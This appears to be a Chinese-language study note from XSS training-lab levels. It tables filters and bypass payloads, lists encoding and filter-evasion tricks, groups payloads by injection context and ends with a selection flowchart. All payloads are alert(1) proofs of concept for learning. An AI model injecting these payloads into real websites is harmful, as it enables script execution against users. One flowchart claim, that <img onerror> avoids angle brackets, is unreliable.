### <font style="color:rgba(0, 0, 0, 0.9);">第一组：XSS 基础分类</font>
**<font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(245, 245, 245);">表格</font>**

| **<font style="color:rgba(0, 0, 0, 0.9);">关卡</font>** | **<font style="color:rgba(0, 0, 0, 0.9);">类型</font>** | **<font style="color:rgba(0, 0, 0, 0.9);">过滤机制</font>** | **<font style="color:rgba(0, 0, 0, 0.9);">绕过方法</font>** | **<font style="color:rgba(0, 0, 0, 0.9);">Payload</font>** |
| :--- | :--- | :--- | :--- | :--- |
| **<font style="color:rgba(0, 0, 0, 0.9);">第一关</font>** | <font style="color:rgba(0, 0, 0, 0.9);">反射型 XSS</font> | <font style="color:rgba(0, 0, 0, 0.9);">无过滤</font> | <font style="color:rgba(0, 0, 0, 0.9);">直接注入</font> | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><script>alert(1)</script></font>` |
| **<font style="color:rgba(0, 0, 0, 0.9);">第二关</font>** | <font style="color:rgba(0, 0, 0, 0.9);">过滤大师</font> | <font style="color:rgba(0, 0, 0, 0.9);">删除 </font>`<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">script</font>` | <font style="color:rgba(0, 0, 0, 0.9);">双写绕过</font> | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"></textarea><scrscriptipt>alert(1)</scrscriptipt></font>` |
| **<font style="color:rgba(0, 0, 0, 0.9);">第三关</font>** | <font style="color:rgba(0, 0, 0, 0.9);">文本清洗官</font> | <font style="color:rgba(0, 0, 0, 0.9);">前端检测 </font>`<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">script</font>`<br/><font style="color:rgba(0, 0, 0, 0.9);">/</font>`<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">alert</font>` | <font style="color:rgba(0, 0, 0, 0.9);">HTML 实体编码</font> | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">&lt;scr&#105;pt&gt;al&#101;rt(1)&lt;/scr&#105;pt&gt;</font>` |


---

### <font style="color:rgba(0, 0, 0, 0.9);">第二组：标签与事件（成就系统）</font>
**<font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(245, 245, 245);">表格</font>**

| **<font style="color:rgba(0, 0, 0, 0.9);">标签</font>** | **<font style="color:rgba(0, 0, 0, 0.9);">事件</font>** | **<font style="color:rgba(0, 0, 0, 0.9);">Payload</font>** | **<font style="color:rgba(0, 0, 0, 0.9);">触发方式</font>** |
| :--- | :--- | :--- | :--- |
| `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">img</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">onerror</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><img src=x onerror=alert(1)></font>` | <font style="color:rgba(0, 0, 0, 0.9);">自动（加载失败）</font> |
| `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">details</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">ontoggle</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><details ontoggle=alert(1) open></font>` | <font style="color:rgba(0, 0, 0, 0.9);">自动（状态切换）</font> |
| `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">div</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">onclick</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><div onclick=alert(1)>x</div></font>` | <font style="color:rgba(0, 0, 0, 0.9);">点击</font> |
| `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">div</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">ondblclick</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><div ondblclick=alert(1)>x</div></font>` | <font style="color:rgba(0, 0, 0, 0.9);">双击</font> |
| `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">div</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">onmouseover</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><div onmouseover=alert(1)>x</div></font>` | <font style="color:rgba(0, 0, 0, 0.9);">悬停</font> |
| `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">div</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">onwheel</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><div onwheel=alert(1)>x</div></font>` | <font style="color:rgba(0, 0, 0, 0.9);">滚轮</font> |
| `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">div</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">onscroll</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><div style="overflow:auto" onscroll=alert(1)>x</div></font>` | <font style="color:rgba(0, 0, 0, 0.9);">滚动</font> |
| `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">div</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">ondrag</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><div draggable="true" ondrag=alert(1)>x</div></font>` | <font style="color:rgba(0, 0, 0, 0.9);">拖拽</font> |
| `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">div</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">oncontextmenu</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><div oncontextmenu=alert(1)>x</div></font>` | <font style="color:rgba(0, 0, 0, 0.9);">右键</font> |
| `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">video</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">onerror</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><video src=x onerror=alert(1)></font>` | <font style="color:rgba(0, 0, 0, 0.9);">自动</font> |
| `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">audio</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">onerror</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><audio src=x onerror=alert(1)></font>` | <font style="color:rgba(0, 0, 0, 0.9);">自动</font> |
| `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">svg</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">onload</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><svg onload=alert(1)></font>` | <font style="color:rgba(0, 0, 0, 0.9);">自动</font> |
| `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">input</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">onfocus</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><input onfocus=alert(1) autofocus></font>` | <font style="color:rgba(0, 0, 0, 0.9);">自动</font> |
| `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">body</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">onload</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><body onload=alert(1)></font>` | <font style="color:rgba(0, 0, 0, 0.9);">自动</font> |
| `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">marquee</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">onstart</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><marquee onstart=alert(1)>x</marquee></font>` | <font style="color:rgba(0, 0, 0, 0.9);">自动</font> |
| `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">iframe</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">onload</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><iframe onload=alert(1)></font>` | <font style="color:rgba(0, 0, 0, 0.9);">自动</font> |
| `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">a</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">href</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><a href="javascript:alert(1)">x</a></font>` | <font style="color:rgba(0, 0, 0, 0.9);">点击</font> |


---

### <font style="color:rgba(0, 0, 0, 0.9);">第三组：HTML 属性注入</font>
**<font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(245, 245, 245);">表格</font>**

| **<font style="color:rgba(0, 0, 0, 0.9);">关卡</font>** | **<font style="color:rgba(0, 0, 0, 0.9);">场景</font>** | **<font style="color:rgba(0, 0, 0, 0.9);">过滤</font>** | **<font style="color:rgba(0, 0, 0, 0.9);">Payload</font>** |
| :--- | :--- | :--- | :--- |
| **<font style="color:rgba(0, 0, 0, 0.9);">第一关</font>** | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">value="[输入]"</font>` | <font style="color:rgba(0, 0, 0, 0.9);">转义 </font>`<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><</font>`<br/>`<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">></font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">" onmouseover=alert(1)</font>` |
| **<font style="color:rgba(0, 0, 0, 0.9);">第二关</font>** | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">type="hidden"</font>` | <font style="color:rgba(0, 0, 0, 0.9);">删除 </font>`<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">(</font>`<br/>`<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">)</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">" type="text" onfocus="window[atob('YWxlcnQ=')](1)" autofocus</font>` |
| **<font style="color:rgba(0, 0, 0, 0.9);">第三关</font>** | <font style="color:rgba(0, 0, 0, 0.9);">日志/Referer</font> | <font style="color:rgba(0, 0, 0, 0.9);">全部转义</font> | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">javascript:alert(1)</font>`<br/><font style="color:rgba(0, 0, 0, 0.9);"> 在 URL 中</font> |


**<font style="color:rgba(0, 0, 0, 0.9);">核心技巧：闭合属性 → 注入新属性</font>**

**<font style="color:rgba(0, 0, 0, 0.9);">plain</font>**

```plain
" on事件=代码        ← 闭合双引号
' on事件=代码        ← 闭合单引号
x on事件=代码        ← 无引号属性，空格分隔
type="text"          ← 覆盖 type="hidden"
```

---

### <font style="color:rgba(0, 0, 0, 0.9);">第四组：JS 上下文逃逸（3关）</font>
**<font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(245, 245, 245);">表格</font>**

| **<font style="color:rgba(0, 0, 0, 0.9);">关卡</font>** | **<font style="color:rgba(0, 0, 0, 0.9);">过滤</font>** | **<font style="color:rgba(0, 0, 0, 0.9);">绕过方法</font>** | **<font style="color:rgba(0, 0, 0, 0.9);">Payload</font>** |
| :--- | :--- | :--- | :--- |
| **<font style="color:rgba(0, 0, 0, 0.9);">第一关</font>** | <font style="color:rgba(0, 0, 0, 0.9);">基础</font> | <font style="color:rgba(0, 0, 0, 0.9);">直接闭合</font> | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">";alert(1);//</font>` |
| **<font style="color:rgba(0, 0, 0, 0.9);">第二关</font>** | <font style="color:rgba(0, 0, 0, 0.9);">删除 </font>`<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">(</font>`<br/>`<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">)</font>`<br/>`<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">;</font>`<br/>`<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">+</font>`<br/>`<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">-</font>`<br/>`<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">/</font>`<br/><font style="color:rgba(0, 0, 0, 0.9);"> 空格</font> | <font style="color:rgba(0, 0, 0, 0.9);">Tagged Template + 逗号运算符</font> | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">",a=alert</font>`<br/><font style="color:rgba(0, 0, 0, 0.9);">1</font>`<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">,b="</font>` |
| **<font style="color:rgba(0, 0, 0, 0.9);">第三关</font>** | <font style="color:rgba(0, 0, 0, 0.9);">"完美处理"</font> | <font style="color:rgba(0, 0, 0, 0.9);">？</font> | <font style="color:rgba(0, 0, 0, 0.9);">待解决</font> |


**<font style="color:rgba(0, 0, 0, 0.9);">核心技巧：闭合 JS 字符串 → 注入 JS 代码</font>**

**<font style="color:rgba(0, 0, 0, 0.9);">plain</font>**

```plain
";代码;//
",a=代码,b="
```

---

## <font style="color:rgba(0, 0, 0, 0.9);">三、常用绕过技巧大全</font>
### <font style="color:rgba(0, 0, 0, 0.9);">1. 双写绕过（删除型过滤）</font>
**<font style="color:rgba(0, 0, 0, 0.9);">HTML</font>**

```html
<scr<script>ipt>alert(1)</scr<script>ipt>
```

<font style="color:rgba(0, 0, 0, 0.9);">过滤 </font>`<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">script</font>`<font style="color:rgba(0, 0, 0, 0.9);"> → 删除后变成 </font>`<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><script></font>`

---

### <font style="color:rgba(0, 0, 0, 0.9);">2. 大小写混合（不区分大小写过滤）</font>
**<font style="color:rgba(0, 0, 0, 0.9);">HTML</font>**

```html
<ScRiPt>alert(1)</ScRiPt>
```

---

### <font style="color:rgba(0, 0, 0, 0.9);">3. HTML 实体编码（前端字符串检测）</font>
**<font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(245, 245, 245);">表格</font>**

| **<font style="color:rgba(0, 0, 0, 0.9);">字符</font>** | **<font style="color:rgba(0, 0, 0, 0.9);">实体</font>** |
| :--- | :--- |
| `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">&lt;</font>`<br/><font style="color:rgba(0, 0, 0, 0.9);"> 或 </font>`<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">&#60;</font>` |
| `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">></font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">&gt;</font>`<br/><font style="color:rgba(0, 0, 0, 0.9);"> 或 </font>`<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">&#62;</font>` |
| `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">"</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">&quot;</font>`<br/><font style="color:rgba(0, 0, 0, 0.9);"> 或 </font>`<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">&#34;</font>` |
| `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">'</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">&#39;</font>` |
| `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">(</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">&#40;</font>` |
| `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">)</font>` | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">&#41;</font>` |


**<font style="color:rgba(0, 0, 0, 0.9);">HTML</font>**

```html
&lt;scr&#105;pt&gt;al&#101;rt(1)&lt;/scr&#105;pt&gt;
```

---

### <font style="color:rgba(0, 0, 0, 0.9);">4. URL 编码</font>
**<font style="color:rgba(0, 0, 0, 0.9);">plain</font>**

```plain
%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

---

### <font style="color:rgba(0, 0, 0, 0.9);">5. JavaScript 编码</font>
**<font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(245, 245, 245);">表格</font>**

| **<font style="color:rgba(0, 0, 0, 0.9);">编码方式</font>** | **<font style="color:rgba(0, 0, 0, 0.9);">示例</font>** |
| :--- | :--- |
| <font style="color:rgba(0, 0, 0, 0.9);">Unicode</font> | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">\u003c</font>`<br/><font style="color:rgba(0, 0, 0, 0.9);"> = </font>`<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><</font>` |
| <font style="color:rgba(0, 0, 0, 0.9);">十六进制</font> | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">\x3c</font>`<br/><font style="color:rgba(0, 0, 0, 0.9);"> = </font>`<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><</font>` |
| <font style="color:rgba(0, 0, 0, 0.9);">八进制</font> | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">\74</font>`<br/><font style="color:rgba(0, 0, 0, 0.9);"> = </font>`<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);"><</font>` |
| <font style="color:rgba(0, 0, 0, 0.9);">Base64</font> | `<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">atob('YWxlcnQoMSk=')</font>`<br/><font style="color:rgba(0, 0, 0, 0.9);"> = </font>`<font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">alert(1)</font>` |


---

### <font style="color:rgba(0, 0, 0, 0.9);">6. 绕过括号过滤</font>
**<font style="color:rgba(0, 0, 0, 0.9);">JavaScript</font>**

```javascript
// Tagged Template Literal（ES6）
alert`1`           // 等同于 alert(['1'])

// 方括号 + 字符串
window["alert"](1)

// 方括号 + Base64
window[atob('YWxlcnQ=')](1)
```

---

### <font style="color:rgba(0, 0, 0, 0.9);">7. 绕过引号过滤</font>
**<font style="color:rgba(0, 0, 0, 0.9);">JavaScript</font>**

```javascript
// 用反引号代替引号
alert`1`

// 用 String.fromCharCode
alert(String.fromCharCode(97,108,101,114,116,40,49,41))

// 用 eval + 编码
eval(atob('YWxlcnQoMSk='))
```

---

### <font style="color:rgba(0, 0, 0, 0.9);">8. 绕过空格过滤</font>
**<font style="color:rgba(0, 0, 0, 0.9);">HTML</font>**

```html
<!-- 用 / 代替空格 -->
<img/src=x/onerror=alert(1)>

<!-- 用换行代替空格 -->
<img
src=x
onerror=alert(1)>
```

---

### <font style="color:rgba(0, 0, 0, 0.9);">9. 闭合标签技巧</font>
**<font style="color:rgba(0, 0, 0, 0.9);">HTML</font>**

```html
<!-- 闭合 textarea -->
</textarea><script>alert(1)</script>

<!-- 闭合 script -->
</script><script>alert(1)</script>
```

---

### <font style="color:rgba(0, 0, 0, 0.9);">10. 伪协议</font>
**<font style="color:rgba(0, 0, 0, 0.9);">HTML</font>**

```html
<a href="javascript:alert(1)">点击</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)">
```

---

## <font style="color:rgba(0, 0, 0, 0.9);">四、按上下文分类的 Payload</font>
### <font style="color:rgba(0, 0, 0, 0.9);">HTML 上下文（标签之间）</font>
**<font style="color:rgba(0, 0, 0, 0.9);">HTML</font>**

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

### <font style="color:rgba(0, 0, 0, 0.9);">HTML 属性上下文（属性值中）</font>
**<font style="color:rgba(0, 0, 0, 0.9);">HTML</font>**

```html
" onmouseover=alert(1)
" onclick=alert(1)
" onfocus=alert(1) autofocus
" type="text" onerror=alert(1)
```

### <font style="color:rgba(0, 0, 0, 0.9);">JavaScript 上下文（字符串中）</font>
**<font style="color:rgba(0, 0, 0, 0.9);">JavaScript</font>**

```javascript
";alert(1);//
",a=alert(1),b="
";eval(atob('YWxlcnQoMSk='));//
",a=alert`1`,b="
```

### <font style="color:rgba(0, 0, 0, 0.9);">URL 上下文（href/src 中）</font>
**<font style="color:rgba(0, 0, 0, 0.9);">plain</font>**

```plain
javascript:alert(1)
javascript:alert`1`
data:text/html,<script>alert(1)</script>
```

---

## <font style="color:rgba(0, 0, 0, 0.9);">五、快速选择 Payload 的流程</font>
**<font style="color:rgba(0, 0, 0, 0.9);">plain</font>**

```plain
开始
  │
  ▼
输入被放在哪里？
  │
  ├── HTML 标签之间 ──→ 直接注入 <script> 或 <img onerror>
  │
  ├── HTML 属性值中 ──→ 闭合引号，注入 on事件
  │
  ├── JS 字符串中 ────→ 闭合字符串，注入代码
  │
  └── URL 中 ─────────→ 用 javascript: 伪协议
  │
  ▼
有过滤吗？
  │
  ├── 删除 script ────→ 双写 <scrscriptipt>
  │
  ├── 删除 () ────────→ 用 alert`1` 或 window["alert"]
  │
  ├── 删除 ; ─────────→ 用逗号运算符 ,
  │
  ├── 转义 < > ───────→ 用 <img onerror>（不需要 <>）
  │
  ├── 前端检测 ───────→ 用 HTML 实体编码
  │
  └── 全部转义 ───────→ 找其他注入点（Referer、Cookie）
```

